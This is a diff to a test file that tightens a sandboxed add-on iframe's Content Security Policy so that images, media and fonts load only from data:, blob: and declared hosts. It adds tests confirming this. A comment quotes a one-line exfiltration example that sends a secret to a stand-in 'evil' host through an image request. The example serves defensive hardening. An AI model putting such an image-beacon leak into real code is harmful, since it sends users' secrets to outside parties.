@@ -104,16 +104,40 @@ describe('srcdocFor', () => {
     });
 
     /**
-     * Subresource loads are not scoped to `networkHosts`, deliberately: an add-on renders
-     * player photos whose URLs are whatever the phone hands it at runtime. `srcdoc.ts`'s
-     * closing note says what that leaves open.
+     * MICA-202: a subresource load is an outbound request like any other. Before this,
+     * `img-src https:` left `new Image().src = 'https://evil/?' + secret` open to every
+     * add-on regardless of what it declared; `srcdoc.ts` has the audit that found nothing
+     * the phone hands an add-on needs it.
      */
-    it('lets images, media and fonts load over https, data: and blob: whatever is declared', () => {
-      for (const html of [srcdocFor('x'), srcdocFor('x', ['https://api.example.com'])]) {
+    it('scopes images, media and fonts to data:, blob: and the declared hosts', () => {
+      const directives = policy(
+        srcdocFor('x', ['https://api.example.com', 'https://cdn.example.com:8443'])
+      );
+      for (const directive of ['img-src', 'media-src', 'font-src']) {
+        expect(directives).toContain(
+          `${directive} data: blob: https://api.example.com https://cdn.example.com:8443`
+        );
+      }
+    });
+
+    it('lets images, media and fonts load only from data: and blob: when nothing is declared', () => {
+      for (const html of [srcdocFor('x'), srcdocFor('x', [])]) {
         const directives = policy(html);
-        expect(directives).toContain('img-src https: data: blob:');
-        expect(directives).toContain('media-src https: data: blob:');
-        expect(directives).toContain('font-src https: data: blob:');
+        expect(directives).toContain('img-src data: blob:');
+        expect(directives).toContain('media-src data: blob:');
+        expect(directives).toContain('font-src data: blob:');
+      }
+    });
+
+    it('admits no bare scheme that would let a subresource reach an undeclared host', () => {
+      const directives = policy(srcdocFor('x', ['https://api.example.com']));
+      for (const directive of ['img-src', 'media-src', 'font-src']) {
+        const value = directives.find((d) => d.startsWith(`${directive} `));
+        expect(value).toBeDefined();
+        // `https:` alone is every https host on the internet; `http:` was never here.
+        expect(value?.split(' ')).not.toContain('https:');
+        expect(value?.split(' ')).not.toContain('http:');
+        expect(value?.split(' ')).not.toContain("'self'");
       }
     });
 
